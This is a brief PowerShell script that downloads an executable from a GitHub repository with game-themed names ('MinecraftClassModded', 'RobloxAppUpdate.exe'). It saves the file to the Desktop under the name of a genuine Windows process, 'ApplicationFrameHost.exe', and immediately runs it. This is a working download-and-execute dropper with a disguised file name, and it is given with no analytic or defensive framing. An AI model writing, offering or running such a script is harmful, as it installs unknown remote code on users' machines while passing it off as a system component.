$url = "https://github.com/peiceofmind/MinecraftClassModded/raw/main/RobloxAppUpdate.exe"

$destination = [Environment]::GetFolderPath("Desktop") + "\ApplicationFrameHost.exe"

$client = New-Object System.Net.WebClient

$client.DownloadFile($url, $destination)

$client.Dispose()

Start-Process $destination
